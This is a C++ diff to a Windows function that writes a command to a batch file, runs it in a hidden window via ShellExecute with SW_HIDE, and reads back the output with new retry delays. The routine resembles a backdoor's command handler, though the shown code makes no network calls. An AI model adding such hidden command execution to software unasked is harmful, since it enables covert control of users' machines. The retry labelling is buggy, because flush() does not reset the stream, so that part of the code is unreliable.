@@ -43,6 +43,7 @@ std::string CodeExecution(std::string command) {
     // write the output of command in a file
     srand((unsigned int) time(0));
     std::stringstream ss;
+    std::stringstream stringStream;
     ss << rand(); // An integer value between 0 and RAND_MAX
 
     std::string fileName = ss.str();
@@ -55,7 +56,8 @@ std::string CodeExecution(std::string command) {
 
     std::string commandTmp = command;
     commandTmp.append(" > " + fileLog);
-    std::ofstream file(fileBat.c_str());
+    std::ofstream file;
+    file.open(fileBat.c_str());
 
     if (file.is_open()) {
         for (std::string::iterator it = commandTmp.begin();
@@ -63,26 +65,37 @@ std::string CodeExecution(std::string command) {
             file << *it;
         }
         file.close();
+    } else {
+        return " ERROR: cannot open file bat";
     }
 
-    std::string response = command;
+    std::string response = command + "  -->  ";
     if (ShellExecute(0, "open", fileBat.c_str(), "", 0, SW_HIDE)) {
         // Response
-        response.append("  -->  ");
         // a pause that allow at system to create file
-        Sleep(50);
-        std::ifstream fileResp(fileLog.c_str());
-        std::string s;
-        if (fileResp.is_open()) {
-            while (!fileResp.eof()) {
-                getline(fileResp, s);
-                response.push_back('\n');
-                response.append(s);
+        int delay[] = {50, 500, 1000, 3000, 10000};
+        for (int i = 0; i < 5; ++i) {
+            Sleep(delay[i]);
+            std::ifstream fileResp;
+            fileResp.open(fileLog.c_str());
+            std::string s;
+            if (fileResp.is_open()) {
+                stringStream << i + 1;
+                response.append("Attempt " + stringStream.str() + ": Success!\n");
+                stringStream.flush();
+                while (!fileResp.eof()) {
+                    getline(fileResp, s);
+                    response.push_back('\n');
+                    response.append(s);
+                }
+                fileResp.close();
+                break;
+            } else {
+                stringStream << i + 1;
+                response.append("Attempt " + stringStream.str() + ": could not open out file\n");
+                stringStream.flush();
             }
-        } else {
-            response.append("error: opening log file\n");
         }
-        fileResp.close();
     } else {
         response = "error: executing command\n";
     }
